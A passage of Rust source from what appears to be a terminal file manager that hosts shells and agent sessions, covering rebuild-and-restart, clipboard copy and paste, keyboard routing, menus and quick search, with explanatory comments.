            .then(|| (root.to_path_buf(), name))
    }

    /// Rebuild, then restart in place. Returns what to tell the caller.
    pub(crate) fn recycle(&mut self, build: Option<bool>) -> Result<String, String> {
        let tree = Self::source_tree();
        let build = build.unwrap_or(tree.is_some());
        let Some((root, profile)) = tree.filter(|_| build) else {
            // Nothing to build: restart on the next turn of the loop, so this
            // call still gets to answer before the process is replaced.
            let _ = self.tx.send(Update::Rebuilt(Ok(())));
            return Ok("restarting".into());
        };

        let tx = self.tx.clone();
        let announcement = format!("rebuilding {profile} in {}", root.display());
        // On a task, never here: a build takes minutes and the event loop must
        // keep drawing — not least so the user can read what the compiler says.
        tokio::task::spawn_blocking(move || {
            let mut cargo = std::process::Command::new("cargo");
            cargo.arg("build").current_dir(&root);
            if profile == "release" {
                cargo.arg("--release");
            }
            let result = match cargo.output() {
                Ok(out) if out.status.success() => Ok(()),
                Ok(out) => Err(String::from_utf8_lossy(&out.stderr).into_owned()),
                Err(e) => Err(e.to_string()),
            };
            let _ = tx.send(Update::Rebuilt(result));
        });

        self.status = "rebuilding…".into();
        Ok(announcement)
    }

    /// Replace this process with a fresh copy of the same binary.
    ///
    /// The sessions are written first and the hosted tree taken down, because
    /// `exec` keeps the pid but not the children: skipping either would leave
    /// the agents orphaned and the layout lost — the two failures this whole
    /// area exists to prevent. What comes back reads the file and reattaches.
    fn restart_in_place(&mut self) {
        self.save_on_exit();
        // The terminal is put back by hand: `exec` never unwinds, so nothing
        // that restores it on drop would ever run.
        crate::terminal::restore();

        #[cfg(unix)]
        {
            use std::os::unix::process::CommandExt;
            let exe = std::env::current_exe().unwrap_or_else(|_| "dmac".into());
            let args: Vec<String> = std::env::args().skip(1).collect();
            let err = std::process::Command::new(exe).args(args).exec();
            // Only reachable if exec failed, and by then the terminal is
            // already restored, so the honest thing is to say why and stop.
            eprintln!("dmac: could not restart: {err}");
        }
        self.should_quit = true;
    }

    /// Keep the hosted shell exactly the size of the pane showing it.
    ///
    /// A terminal program redraws itself when its terminal changes size, and it
    /// only knows because the terminal tells it. This used to happen lazily, on
    /// the way through `send_to_shell`, so a hosted `vim` or `htop` kept the old
    /// geometry until the user pressed a key — the window had been resized and
    /// the program inside it had not been told.
    ///
    /// Called after the frame, because the pane's size is what the renderer just
    /// recorded. The child repaints in its own time and its output asks for the
    /// frame that shows it.
    pub(crate) fn sync_shell_size(&mut self) {
        if self.ses().view != View::Shell {
            return;
        }
        let (cols, rows) = self.shell_size();
        let reflowed = self
            .ses()
            .hosted()
            .is_some_and(|sh| sh.size() != (cols, rows));
        if let Some(sh) = self.ses_mut().shell.as_mut() {
            // `resize` is a no-op when the size already matches, so this costs
            // nothing on the overwhelming majority of frames.
            let _ = sh.resize(cols, rows);
        }
        // A resize rewraps every line, so a selection and a scroll position
        // expressed in rows no longer point at what they were put on.
        if reflowed {
            self.shell_to_live();
        }
    }

    /// Remove the selected text from the command line, if any, and forget the
    /// selection. Returns whether anything was removed.
    fn take_command_selection(&mut self) -> bool {
        let Some((lo, hi)) = self.command_selection_span() else {
            return false;
        };
        let line = &self.ses().command_line;
        let kept: String = line
            .chars()
            .enumerate()
            .filter(|(i, _)| *i < lo || *i >= hi)
            .map(|(_, c)| c)
            .collect();
        self.ses_mut().command_line = kept;
        self.command_selection = None;
        true
    }

    /// Grow or shrink the command-line selection by characters.
    fn extend_command_selection(&mut self, delta: isize) {
        let len = self.ses().command_line.chars().count();
        let head = match self.command_selection {
            Some((_, head)) => head,
            // No gesture yet: the caret sits at the end of what is typed, which
            // is the only place it can be — there is nowhere else to put it.
            None => len,
        };
        let next = head.saturating_add_signed(delta).min(len);
        self.set_command_selection_head(next);
    }

    fn set_command_selection_head(&mut self, head: usize) {
        let len = self.ses().command_line.chars().count();
        let head = head.min(len);
        let anchor = self.command_selection.map_or(len, |(a, _)| a).min(len);
        // Back at the anchor is no selection at all, rather than an empty one:
        // an empty selection would make Copy replace the clipboard with nothing.
        self.command_selection = (anchor != head).then_some((anchor, head));
    }

    /// The selected text on the command line, in reading order.
    pub(crate) fn command_selection_text(&self) -> Option<String> {
        let (a, b) = self.command_selection?;
        let (lo, hi) = if a <= b { (a, b) } else { (b, a) };
        let line = &self.ses().command_line;
        Some(line.chars().skip(lo).take(hi - lo).collect())
    }

    /// The selected span as char offsets, low first, for the renderer.
    pub(crate) fn command_selection_span(&self) -> Option<(usize, usize)> {
        let (a, b) = self.command_selection?;
        Some(if a <= b { (a, b) } else { (b, a) })
    }

    /// Put the selection on the clipboard — the shell's, or the command line.
    fn copy_selection(&mut self) {
        // A deliberate selection first, whichever it is, then the whole command
        // line as the obvious fallback.
        let text = match self.shell_selection.zip(self.ses().hosted()) {
            Some((sel, sh)) => sel.text(sh),
            None => match self.command_selection_text() {
                Some(t) => t,
                None if !self.ses().command_line.is_empty() => self.ses().command_line.clone(),
                None => {
                    self.status = "nothing to copy".into();
                    return;
                }
            },
        };
        if text.trim().is_empty() {
            self.status = "nothing selected".into();
            return;
        }
        let n = text.chars().count();
        match self.copy_out(&text) {
            Ok(how) => self.status = format!("copied {n} characters{how}"),
            Err(e) => self.status = format!("could not copy: {e}"),
        }
    }

    /// Put `text` on the clipboard by whichever route this terminal has, and
    /// say which one it was.
    ///
    /// The local clipboard first. When there is none — a bare Linux box, or
    /// anywhere over SSH — ask the terminal for its own: over SSH that is not a
    /// fallback but the only correct answer, because the system clipboard on
    /// this side belongs to the wrong machine and the terminal at the far end
    /// is the one the user is looking at.
    fn copy_out(&mut self, text: &str) -> Result<&'static str, String> {
        match dmac_core::clipboard::set_text(text) {
            Ok(()) => Ok(""),
            Err(e) => match dmac_core::clipboard::osc52(text) {
                Some(seq) => {
                    self.pending_terminal_write.push_str(&seq);
                    Ok(" via the terminal")
                }
                None => Err(e.to_string()),
            },
        }
    }

    /// Paste the clipboard wherever the keyboard is.
    fn paste_into_shell(&mut self) {
        match dmac_core::clipboard::text() {
            Ok(t) => self.paste_text(&t),
            Err(e) => self.status = format!("nothing to paste: {e}"),
        }
    }

    /// Put `text` wherever the keyboard is.
    ///
    /// Shared by the binding and by the terminal's own paste, so both land in
    /// the same place and behave the same way — a paste that meant something
    /// different depending on which key produced it would be worse than one
    /// that only worked sometimes.
    fn paste_text(&mut self, text: &str) {
        let text = text.to_string();
        if text.is_empty() {
            return;
        }
        // A screensaver or a menu is not a place to paste into; the keystroke
        // that woke it has already been consumed by dismissing it.
        if self.screensaver.is_active() || self.mode != Mode::Normal {
            return;
        }
        // On the panels there is no child to send bytes to, so it goes on the
        // command line — which is where you were about to type it anyway.
        // Refusing to paste unless a shell happens to be showing is not a
        // safety measure, it is just a paste that does not work.
        if self.ses().view != View::Shell {
            let n = text.chars().count();
            // Newlines would run as separate commands the moment Enter is
            // pressed; a paste is text, not a decision to run three things.
            let flat = text
                .lines()
                .map(str::trim_end)
                .filter(|l| !l.is_empty())
                .collect::<Vec<_>>()
                .join(" ");
            self.ses_mut().command_line.push_str(&flat);
            self.ses_mut().focus = Focus::CommandLine;
            self.status = format!("pasted {n} characters");
            return;
        }

        let n = text.chars().count();
        match self.write_to_child(&text) {
            Ok(true) => self.status = format!("pasted {n} characters"),
            Ok(false) => self.status = format!("pasted {n} characters — press Enter to run"),
            Err(e) => self.status = format!("paste: {e}"),
        }
    }

    /// Hand `text` to the hosted child as if it had been pasted into it, and
    /// say whether the child took it bracketed.
    ///
    /// Bracketed paste tells the shell "this is text, not typing", so a pasted
    /// newline lands as a newline instead of running the line. When the shell
    /// has not asked for it there is no way to say that, so the trailing
    /// newline is dropped: the command arrives ready to run and the user still
    /// has to press Enter. Pasting something that executes itself is the one
    /// outcome worth engineering against.
    fn write_to_child(&mut self, text: &str) -> Result<bool, String> {
        let bracketed = self
            .ses()
            .hosted()
            .and_then(|sh| sh.with_screen(|s| s.bracketed_paste()))
            .unwrap_or(false);

        let mut payload = String::new();
        if bracketed {
            payload.push_str("\x1b[200~");
            payload.push_str(text);
            payload.push_str("\x1b[201~");
        } else {
            payload.push_str(text.trim_end_matches(['\n', '\r']));
        }

        let waker = self.waker();
        let (cols, rows) = self.shell_size();
        let sh = self
            .ses_mut()
            .shell(cols, rows, waker)
            .map_err(|e| e.to_string())?;
        sh.write(payload.as_bytes()).map_err(|e| e.to_string())?;
        Ok(bracketed)
    }

    /// Escape sequences owed to the real terminal, taken for writing.
    pub(crate) fn take_terminal_write(&mut self) -> Option<String> {
        (!self.pending_terminal_write.is_empty())
            .then(|| std::mem::take(&mut self.pending_terminal_write))
    }

    /// Where in the hosted screen a screen position falls, if it is over it.
    fn shell_cell_at(&self, column: u16, row: u16) -> Option<(u16, u16)> {
        let a = self.layout.shell;
        if self.ses().view != View::Shell || a.width == 0 || a.height == 0 {
            return None;
        }
        if column < a.x || column >= a.x + a.width || row < a.y || row >= a.y + a.height {
            return None;
        }
        Some((row - a.y, column - a.x))
    }

    /// Strip the frame off, or put it back.
    fn toggle_fullscreen(&mut self) {
        self.fullscreen = !self.fullscreen;
        self.status = if self.fullscreen {
            "full screen — F11 to bring the frame back".into()
        } else {
            String::new()
        };
    }

    /// Show the shell, or go back to the panels.
    fn toggle_shell(&mut self) {
        if self.ses().view == View::Shell {
            self.ses_mut().view = View::Panels;
            self.status.clear();
            // Only on the way out, and only for the next key: coming *into* a
            // shell there is nothing to escape from, and a chord that stayed
            // armed would eat the first letter of a quick search.
            self.chord = true;
            return;
        }
        let (cols, rows) = self.shell_size();
        let waker = self.waker();
        match self.ses_mut().shell(cols, rows, waker) {
            Ok(_) => {
                // Norton's Ctrl-O landed you where the panel was, and that is
                // most of why it was worth pressing. Done on the way in rather
                // than on every navigation, so a shell you are not looking at
                // is never typed into behind your back.
                self.ses_mut().follow_panel_cwd();
                self.ses_mut().view = View::Shell;
                // The keys that still reach the commander are named on the
                // shell's own bottom border, which is always there; a status
                // line saying the same thing would only compete with it.
                self.status.clear();
            }
            // A shell that will not start must say why. A blank pane the user
            // cannot explain is the worst possible outcome here.
            Err(e) => self.status = format!("shell: {e}"),
        }
    }

    /// Run what is on the command line in the session's shell.
    ///
    /// Switches to the shell view, because a command whose output you cannot
    /// see has not really run as far as the user is concerned.
    fn run_command(&mut self) {
        let line = self.ses().command_line.trim().to_string();
        if line.is_empty() {
            return;
        }
        if let Err(e) = self.run_line(&line) {
            self.status = format!("shell: {e}");
        }
    }

    /// Run a line in the current session's shell, and show it.
    ///
    /// Split out so the same path serves the command line and a tool call —
    /// two ways of running a command that could drift apart is two ways of
    /// running a command that eventually behave differently.
    pub(crate) fn run_line(&mut self, line: &str) -> Result<(), String> {
        let (cols, rows) = self.shell_size();
        let waker = self.waker();
        let shell = self
            .ses_mut()
            .shell(cols, rows, waker)
            .map_err(|e| e.to_string())?;
        shell.run(line).map_err(|e| e.to_string())?;
        self.ses_mut().command_line.clear();
        self.ses_mut().view = View::Shell;
        self.status.clear();
        Ok(())
    }

    /// A movement that is not a Shift-selection: it ends any running gesture.
    fn move_plain(&mut self, f: impl FnOnce(&mut Panel)) {
        let p = self.ses_mut().active_panel_mut();
        p.end_selection_gesture();
        f(p);
    }

    /// A Shift-selection step, reporting the running total.
    ///
    /// Saying how many rows are selected is what stops this feeling like a mode
    /// you fell into: the count changes as you move, so it is obvious what the
    /// keys are doing.
    fn extend(&mut self, f: impl FnOnce(&mut Panel)) {
        f(self.ses_mut().active_panel_mut());
        let n = self.ses().active_panel().operands().len();
        self.status = format!("{n} selected");
    }

    /// Settle the UI after the visible session changes.
    ///
    /// Nothing is reloaded: every session keeps its listings, which is the whole
    /// point of holding them all live. Only the transient, per-view state that
    /// belonged to the session we just left is cleared.
    pub(crate) fn after_session_switch(&mut self) {
        // Where the session we just left had its editor window. Asked here
        // rather than at the moment of switching because the switch happens in
        // half a dozen places — a key, a click, the rail, an agent's tool call —
        // and a capture that has to be remembered at each of them is a capture
        // that will be forgotten at one.
        if let Some(left) = self.last_session.take()
            && let Some(i) = self.sessions.index_of_id(left)
            && i != self.sessions.current_index()
        {
            self.capture_editor_frame(i);
        }
        self.last_session = Some(self.sessions.current().id);
        self.raise_editor_here();
        self.ensure_loaded(self.sessions.current_index());
        self.touch_sessions();
        self.quick_search.clear();
        // Close an overlay that belonged to the session we left — but not the
        // rail, which is how you got here and where you still are. Clobbering it
        // silently dropped the keyboard back to the panels, so the next
        // keystrokes landed on files instead of on the session list.
        if !matches!(self.mode, Mode::Rail { .. } | Mode::Prompt { .. }) {
            self.mode = Mode::Normal;
        }
        self.drag = None;
        self.last_click = None;
        self.status = format!(
            "{} ({} of {})",
            self.ses().name,
            self.sessions.current_index() + 1,
            self.sessions.len()
        );
    }

    /// The contextual commands for the current entry.
    ///
    /// Built fresh each time rather than filtered from a fixed list: a menu that
    /// offers Delete on `..` is a menu that will eventually delete the wrong thing.
    pub(crate) fn context_items(&self) -> Vec<crate::ui::menu::Item<'static>> {
        use crate::ui::menu::Item;
        let Some(entry) = self.ses().active_panel().current() else {
            return vec![Item::new("Refresh", "Ctrl-R")];
        };

        match entry.kind {
            dmac_core::EntryKind::Parent => vec![
                Item::new("Go up", "Enter"),
                Item::SEPARATOR,
                Item::new("Refresh", "Ctrl-R"),
                Item::new("Make directory", "F7"),
            ],
            dmac_core::EntryKind::Dir => vec![
                Item::new("Open", "Enter"),
                Item::SEPARATOR,
                Item::new("Copy", "F5"),
                Item::new("Move / Rename", "F6"),
                Item::new("Delete", "F8"),
                Item::SEPARATOR,
                Item::new("Select", "Ins"),
                Item::new("Copy path", ""),
            ],
            _ => vec![
                Item::new("Open", "Enter"),
                Item::new("View", "F3"),
                Item::new("Edit", "F4"),
                Item::SEPARATOR,
                Item::new("Copy", "F5"),
                Item::new("Move / Rename", "F6"),
                Item::new("Delete", "F8"),
                Item::SEPARATOR,
                Item::new("Select", "Ins"),
                Item::new("Copy path", ""),
            ],
        }
    }

    fn open_context_menu(&mut self, anchor: (u16, u16)) {
        let items = self.context_items();
        self.mode = Mode::Context {
            selected: crate::ui::menu::first_selectable(&items),
            anchor,
        };
    }

    /// Run the chosen row. Matching on the label keeps the menu declarative;
    /// an unknown label is reported rather than silently ignored.
    fn run_context_item(&mut self, selected: usize) {
        let items = self.context_items();
        let Some(item) = items.get(selected) else {
            self.mode = Mode::Normal;
            return;
        };
        let label = item.label;
        self.mode = Mode::Normal;

        match label {
            "Open" | "Go up" => self.activate(),
            "View" => self.handle(Action::View),
            "Edit" => self.handle(Action::Edit),
            "Copy" => self.handle(Action::Copy),
            "Move / Rename" => self.handle(Action::Move),
            "Delete" => self.handle(Action::Delete),
            "Make directory" => self.handle(Action::MakeDir),
            "Select" => self.handle(Action::ToggleSelection),
            "Refresh" => self.handle(Action::Refresh),
            "Copy path" => {
                let path = self.cwd_display(self.ses().active);
                let name = self
                    .ses()
                    .active_panel()
                    .current()
                    .map(|e| e.name.clone())
                    .unwrap_or_default();
                self.status = format!("{path}/{name} — clipboard not wired up yet");
            }
            other => self.status = format!("{other} — not implemented yet"),
        }
    }

    /// Incremental search within the focused panel.
    ///
    /// The buffer expires after a pause: a letter typed a minute later starts a
    /// new search rather than silently extending the old one, which is the
    /// behaviour that makes quick-search feel broken elsewhere.
    fn quick_search(&mut self, c: char) {
        const EXPIRY: std::time::Duration = std::time::Duration::from_millis(1200);
        if self.last_search.elapsed() > EXPIRY {
            self.quick_search.clear();
        }
        self.last_search = std::time::Instant::now();
        self.quick_search.push(c);

        let needle = self.quick_search.clone();
        self.seek(&needle);
    }

    fn seek(&mut self, needle: &str) {
        // Search from the top so extending the buffer narrows the same result
        // rather than skipping to the next match of the longer string.
        let i = Self::idx(self.ses().active);
        let found = self.ses().panels[i]
            .entries
            .iter()
            .position(|e| e.name.to_lowercase().starts_with(&needle.to_lowercase()));

        match found {
            Some(index) => {
                self.ses_mut().panels[i].move_to(index);
                self.status = format!("search: {needle}");
            }
            None => self.status = format!("search: {needle}  (no match)"),
        }
    }

    fn clear_quick_search(&mut self) {
        if !self.quick_search.is_empty() {
            self.quick_search.clear();
            self.status.clear();
        }
    }

    /// Report what an unimplemented operation *would* act on. Even before the
    /// engine exists, this proves the selection model is right.
    fn pending_op(&self, label: &str) -> String {
        let p = self.ses().active_panel();
        let n = p.operands().len();
        format!("{label}: {n} item(s) selected — engine not implemented yet")
    }

    /// Route one terminal event.
    ///
    /// Order matters: a running effect gets first refusal (so a game keeps its
    /// arrow keys), then an open overlay, then the keymap.
    fn on_input(&mut self, ev: Event) {
        match ev {
            Event::Key(k) if k.kind == KeyEventKind::Press => self.on_key(k),
            Event::Mouse(m) => self.on_mouse(m),
            // The terminal's own paste. DMACommander asks for bracketed paste
            // at startup, so Cmd-V, Ctrl-Shift-V and a middle click all arrive
            // here as one event rather than as a burst of keystrokes — and
            // dropping it, which is what used to happen, is the whole of "paste
            // does not work": the user presses the key their terminal handles,
            // and nothing at all comes out.
            Event::Paste(text) => self.paste_text(&text),
            // A resize is picked up by the next draw; a focus change counts as
            // activity so the screensaver does not start under a window the user
            // is actively looking at.
            Event::Resize(..) | Event::FocusGained | Event::FocusLost => {
                self.screensaver.on_activity();
            }
            _ => {}
        }
    }

    fn on_key(&mut self, k: KeyEvent) {
        if self.dismiss_splash() {
            return;
        }
        // While a screensaver is showing, the keys that start one move on to
        // the next instead, so one key walks the whole catalogue. Before the
        // effect sees the key: a game would otherwise keep it, and a
        // screensaver would be dismissed by the key meant to change it.
        if self.screensaver.is_active()
            && matches!(
                keymap::resolve(k, self.ses().focus),
                Some(Action::ScreensaverNext | Action::ScreensaverMenu)
            )
        {
            self.screensaver_next();
            return;
        }
        match self.screensaver.on_key(effect_key(k)) {
            // A game used the key, or a screensaver was dismissed by it. Either
            // way the application must not also act on it — waking a screen is
            // not the gesture that confirms a delete.
            Wake::Consumed | Wake::Dismissed => return,
            Wake::Passthrough => {}
        }

        match self.mode {
            Mode::Picker { selected } => return self.picker_key(k, selected),
            Mode::Help { scroll } => return self.help_key(k, scroll),
            Mode::View { scroll, hex } => return self.view_key(k, scroll, hex),
            Mode::UserMenu { selected } => return self.user_menu_key(k, selected),
            Mode::Context { selected, anchor } => return self.context_key(k, selected, anchor),
            Mode::Rail { selected } => return self.rail_key(k, selected),
            Mode::Prompt { intent } => return self.prompt_key(k, intent),
            Mode::Utilities { selected } => return self.utilities_key(k, selected),
            Mode::History { selected } => return self.history_key(k, selected),
            Mode::Reattach { selected } => return self.reattach_key(k, selected),
            Mode::Normal => {}
        }

        // While the shell is showing it owns the keyboard, or half the keys a
        // shell needs would be eaten by the file manager. Two bindings are
        // reserved: the one that gets you back out, and the one that changes
        // how the screen is drawn — a display mode that stopped working in one
        // view would be a worse surprise than a hosted program losing F11.
        if self.ses().view == View::Shell {
            // Reading back through what the shell has printed, and selecting
            // it, comes first: these are Shift and Ctrl-Shift combinations that
            // no shell wants, and that the keymap would otherwise resolve to
            // panel actions with no panel on screen to act on.
            if self.shell_scrollback_key(k) {
                return;
            }
            // F9 and F12 reach the commander from inside a shell, where every
            // other F-key goes to the child. In the panels they keep their
            // canon meanings — F9 the menu, F12 the screensavers — and this is
            // the only place the two differ. It is also the only place where a
            // terminal that cannot encode Ctrl with Shift has no other way in:
            // Apple's Terminal sends Ctrl-Shift-H as byte 0x08, which is what
            // Ctrl-H and Backspace send, so nothing can tell them apart. The
            // cost is that a hosted program never sees these two keys.
            match k.code {
                KeyCode::F(9) => {
                    self.handle(Action::UtilitiesMenu);
                    return;
                }
                // The bare key only: Shift-F12 is the screensaver in here as
                // everywhere else, and resolves below.
                KeyCode::F(12) if !k.modifiers.contains(KeyModifiers::SHIFT) => {
                    self.handle(Action::DirectoryHistory);
                    return;
                }
                _ => {}
            }
            match keymap::resolve(k, self.ses().focus) {
                Some(Action::ToggleShell) => {
                    self.toggle_shell();
                    return;
                }
                Some(Action::ToggleFullscreen) => {
                    self.toggle_fullscreen();
                    return;
                }
                Some(a @ (Action::ClipboardCopy | Action::ClipboardPaste)) => {
                    self.handle(a);
                    return;
                }
                // Shift-Tab, never: a hosted program uses it for its own modes
                // — it is how `claude` cycles between asking and not asking —
                // and a rail that opened on it would be reaching into the
                // program it hosts. Falls through to the child, which is the
                // only place it can mean anything here.
                //
                // Ctrl-Shift-Tab keeps the rail, but only where the terminal
                // can spell it: without the kitty protocol the two arrive as
                // the same three bytes, and no application can tell them apart.
                // What works everywhere is `Ctrl-T`, and `Ctrl-O` then Tab.
                Some(Action::ToggleRail)
                    if matches!(k.code, KeyCode::Tab | KeyCode::BackTab)
                        && !k.modifiers.contains(KeyModifiers::CONTROL) => {}
                // Sessions stay reachable from inside a shell. Being able to
                // start something long-running and then leave it to look at
                // another session is most of what several sessions are for.
                Some(
                    a @ (Action::ToggleRail
                    | Action::CycleSession(_)
                    | Action::SwitchSession(_)
                    | Action::ScreensaverNext),
                ) => {
                    self.handle(a);
                    return;
                }
                // Ctrl-Shift-U, never plain Ctrl-U: in a shell that is
                // readline's kill-line, and a file manager that swallowed it
                // would break every shell it hosts.
                Some(Action::UtilitiesMenu)
                    if k.modifiers
                        .intersects(KeyModifiers::SHIFT | KeyModifiers::SUPER) =>
                {
                    self.handle(Action::UtilitiesMenu);
                    return;
                }
                // Ctrl-Shift-H, never plain Ctrl-H: bare Ctrl-H is backspace to
                // every program a shell hosts.
                Some(Action::DirectoryHistory)
                    if k.modifiers
                        .intersects(KeyModifiers::SHIFT | KeyModifiers::SUPER) =>
                {
                    self.handle(Action::DirectoryHistory);
                    return;
                }
                _ => {}
            }
            self.send_to_shell(k);
            return;
        }

        // Exactly one key after Ctrl-O has brought us out of a shell. Anything
        // not in the chord falls through and is handled normally, so this costs
        // nothing but two letters, and only in the instant after leaving a
        // shell — where a quick search is the least likely thing to be starting.
        if std::mem::take(&mut self.chord) {
            match k.code {
                KeyCode::Char(c) if c.eq_ignore_ascii_case(&'h') => {
                    self.handle(Action::DirectoryHistory);
                    return;
                }
                KeyCode::Char(c) if c.eq_ignore_ascii_case(&'u') => {
                    self.handle(Action::UtilitiesMenu);
                    return;
                }
                KeyCode::Tab => {
                    self.handle(Action::CycleSession(1));
                    return;
                }
                KeyCode::BackTab => {
                    self.handle(Action::CycleSession(-1));
                    return;
                }
                _ => {}
            }
        }

        if let Some(action) = keymap::resolve(k, self.ses().focus) {
            self.handle(action);
        }
    }

    /// Driving the utilities menu.
    fn utilities_key(&mut self, k: KeyEvent, selected: usize) {
        let sessions = self.session_menu_rows();
        let items = crate::utilities::items(&sessions);
        match k.code {
            KeyCode::Esc => self.mode = Mode::Normal,
            KeyCode::Up => {
                if let Some(i) = crate::ui::menu::next_selectable(&items, selected, -1) {
                    self.mode = Mode::Utilities { selected: i };
                }
            }
            KeyCode::Down => {
                if let Some(i) = crate::ui::menu::next_selectable(&items, selected, 1) {
                    self.mode = Mode::Utilities { selected: i };
                }
            }
            KeyCode::Enter => {
                if let Some(c) = crate::utilities::at(selected, &sessions) {
                    self.chose(c);
                }
            }
            // The accelerator shown in the hint column. A menu that lists its
            // shortcuts and does not answer to them is worse than one that
            // lists none.
            KeyCode::Char(c) => {
                if let Some(c) = crate::utilities::from_key(c.to_ascii_lowercase(), &sessions) {
                    self.chose(c);
                }
            }
            _ => {}
        }
    }

    /// Act on a row of the utilities menu.
    fn chose(&mut self, choice: crate::utilities::Choice) {
        match choice {
            crate::utilities::Choice::Do(u) => self.run_utility(u),
            crate::utilities::Choice::GoTo(index) => {
                self.mode = Mode::Normal;
                if self.sessions.switch_to(index) {
                    self.after_session_switch();
                }
            }
        }
    }

    /// Apply a utility to the command line, and get out of the menu's way.
    fn run_utility(&mut self, u: crate::utilities::Utility) {
        use crate::utilities::{Context, Outcome};

        let ses = self.ses();
        let this = Self::idx(ses.active);
        let other = 1 - this;
        let panel = &ses.panels[this];
        let base = ses.cwd[this].clone();
        let names: Vec<String> = panel.operands().iter().map(|e| e.name.clone()).collect();
        let paths: Vec<String> = names
            .iter()
            .map(|n| match base.join(n) {
                Some(p) => p.to_string(),
                // A name the VFS refuses to join is shown as itself rather than
                // dropped: a shorter list than the one you selected is the kind
                // of wrong that gets noticed after the command has run.
                None => n.clone(),
            })
            .collect();

        // What the utilities act on: the shell's selection when there is one,
        // and the command line otherwise. Reachable from the shell view, this
        // is the difference between a useful menu and one whose transforms all
        // report an empty command line.
        let selection = self
            .shell_selection
            .zip(ses.hosted())
            .map(|(sel, sh)| sel.text(sh));

        let cx = Context {
            line: &ses.command_line,
            selection: selection.as_deref(),
            this_path: ses.cwd[this].to_string(),
            other_path: ses.cwd[other].to_string(),
            selected: names,
            selected_paths: paths,
        };

        // Once: half of these produce a fresh random value every time they are
        // asked, and asking twice to look at the answer twice would generate a
        // token, throw it away, and hand over a different one.
        let outcome = crate::utilities::run(u, &cx);

        // A deed is not text: nothing to insert, nothing to copy, and the
        // menu's job is over the moment it is named.
        if let Outcome::Do(deed) = outcome {
            self.mode = Mode::Normal;
            match deed {
                crate::utilities::Deed::OpenEditorHere => self.open_editor_here(),
                crate::utilities::Deed::StartAgentHere => self.start_agent_here(),
                crate::utilities::Deed::StartAgentBeside => self.start_agent_beside(),
            }
            return;
        }

        let text = match outcome {
            Outcome::Insert(text) if self.ses().view != View::Shell => {
                let line = &mut self.ses_mut().command_line;
                // A separating space, but only where one is wanted: after
                // `cd ` there is already one, and at the start there is nothing
                // to separate from.
                if !line.is_empty() && !line.ends_with(' ') {
                    line.push(' ');
                }
                line.push_str(&text);
                text
            }
            Outcome::Replace(text) if self.ses().view != View::Shell => {
                self.ses_mut().command_line = text.clone();
                text
            }
            // In the shell view the command line is not even drawn, so putting
            // the answer there is putting it nowhere: the user asked for a
            // uuid while talking to an agent and had to go and find it in the
            // commander afterwards. Type it in front of them instead — where
            // the cursor is, in whatever the shell is running.
            Outcome::Insert(text) | Outcome::Replace(text) => {
                if let Err(e) = self.write_to_child(&text) {
                    self.mode = Mode::Normal;
                    self.status = format!("{}: {e}", u.label());
                    return;
                }
                text
            }
            // Left open on purpose: the menu is still there to pick something
            // else, which is what you want when you picked the wrong entry.
            Outcome::Nothing(why) => {
                self.status = why.to_string();
                return;
            }
            // Answered above, before anything was computed for the line.
            Outcome::Do(_) => return,
        };
        // And on the clipboard as well, always. A utility exists to produce
        // something you are about to use somewhere — often in another window
        // entirely — and having to select what was just generated in order to
        // copy it is the step this menu was meant to remove.
        let copied = self.copy_out(&text);
        self.after_utility(u, copied);
    }

    /// Close the menu and put the keyboard where the text landed.
    fn after_utility(&mut self, u: crate::utilities::Utility, copied: Result<&str, String>) {
        self.mode = Mode::Normal;
        let label = u.label();
        self.status = if self.ses().view == View::Shell {
            match copied {
                Ok(how) => format!("{label} — typed into the shell, copied{how}"),
                Err(e) => format!("{label} — typed into the shell, but not copied: {e}"),
            }
        } else {
            // The keyboard follows the text: it landed on the command line, so
            // that is where the next keystroke belongs.
            self.ses_mut().focus = Focus::CommandLine;
            match copied {
                Ok(how) => format!("{label} — copied{how}; Enter to run, Ctrl-Y to clear"),
                Err(_) => format!("{label} — Enter to run, Ctrl-Y to clear"),
            }
        };
        self.touch_sessions();
    }

    fn picker_key(&mut self, k: KeyEvent, selected: usize) {
        let catalog = dmac_fx::catalog();
        let rows = crate::ui::picker::row_count(catalog);

        match k.code {
            KeyCode::Esc => self.mode = Mode::Normal,
            // Wrapping: a six-item list is faster to reach by wrapping than by
            // scrolling back up.
            KeyCode::Up => {
                self.mode = Mode::Picker {
                    selected: (selected + rows - 1) % rows,
                }
            }
            KeyCode::Down => {
                self.mode = Mode::Picker {
                    selected: (selected + 1) % rows,
                }
            }
            KeyCode::Home => self.mode = Mode::Picker { selected: 0 },
            KeyCode::End => self.mode = Mode::Picker { selected: rows - 1 },
            KeyCode::Enter => self.start_picked(selected),
            // The picker's own key, pressed again, starts what is highlighted:
            // F12 F12 is a screensaver in two presses, in any terminal at all.
            _ if matches!(
                keymap::resolve(k, Focus::Panel),
                Some(Action::ScreensaverMenu | Action::ScreensaverNext)
            ) =>
            {
                self.start_picked(selected)
            }
            _ => {}
        }
    }

    // ---- F2, the user's own commands ----

    /// F2: read both menus and show them.
    ///
    /// Re-read every time rather than cached. A menu you edited and have to
    /// restart to see is a menu you stop editing, and the cost is two small
    /// files off a local disk.
    fn open_user_menu(&mut self) {
        self.menu_global = dmac_config::menu::Menu::global().unwrap_or_else(|e| {
            // A broken menu is worth saying out loud — silently having no
            // commands is indistinguishable from never having written any.
            self.status = format!("your menu: {e}");
            None
        });
        let cwd = self.ses().cwd[Self::idx(self.ses().active)].clone();
        self.menu_directory = match cwd.is_local() {
            false => None,
            true => dmac_config::menu::Menu::for_directory(cwd.as_path(), &self.trust)
                .unwrap_or_else(|e| {
                    self.status = format!("this directory's menu: {e}");
                    None
                }),
        };

        self.menu_rows = self.build_menu_rows();
        // Empty means *nothing was written*, which is not the same as nothing
        // being runnable: a directory menu awaiting trust is full of commands
        // you can read, and telling that user to go and write some would be
        // telling them the opposite of what is true.
        let nothing = self
            .menu_global
            .as_ref()
            .is_none_or(|m| m.entries.is_empty())
            && self
                .menu_directory
                .as_ref()
                .is_none_or(|m| m.entries.is_empty());
        if nothing {
            self.status = format!(
                "no commands yet \u{2014} write some in ~/.config/dmac/menu.toml or {}",
                dmac_config::menu::DIRECTORY_MENU
            );
            return;
        }
        // Onto the first row that can actually be chosen.
        let first = self
            .menu_rows
            .iter()
            .position(|r| r.from.is_some() && !r.inert)
            .unwrap_or(0);
        self.mode = Mode::UserMenu { selected: first };
    }

    /// The rows, in the order they are drawn: yours, then the directory's.
    ///
    /// A letter used by both belongs to the directory's — it is the more
    /// specific answer — and the one it displaces is marked rather than hidden.
    /// Silently dropping a command from your own menu because a repository you
    /// cloned happens to use that letter is exactly the surprise this whole
    /// area exists to avoid.
